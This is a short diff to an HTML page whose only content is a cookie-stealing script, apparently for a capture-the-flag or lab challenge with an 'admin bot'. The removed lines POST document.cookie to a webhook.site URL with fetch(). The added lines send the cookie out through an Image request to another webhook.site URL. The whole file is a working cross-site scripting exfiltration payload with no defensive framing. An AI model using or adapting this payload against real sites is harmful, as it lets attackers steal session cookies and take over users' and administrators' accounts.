@@ -1,12 +1,9 @@
 <html>
   <body>
     <script>
-      // Steal admin's cookies and send to your webhook
-      fetch("https://webhook.site/92ccd626-bea2-4614-b19e-73a72927b9e9", {
-        method: "POST",
-        mode: "no-cors",
-        body: document.cookie
-      });
+      // When admin bot visits, send their cookie to you
+      new Image().src = "https://webhook.site/5aad0fcd-0ad2-48bb-950c-7265ce3113da?c=" + document.cookie;
     </script>
   </body>
 </html>
+
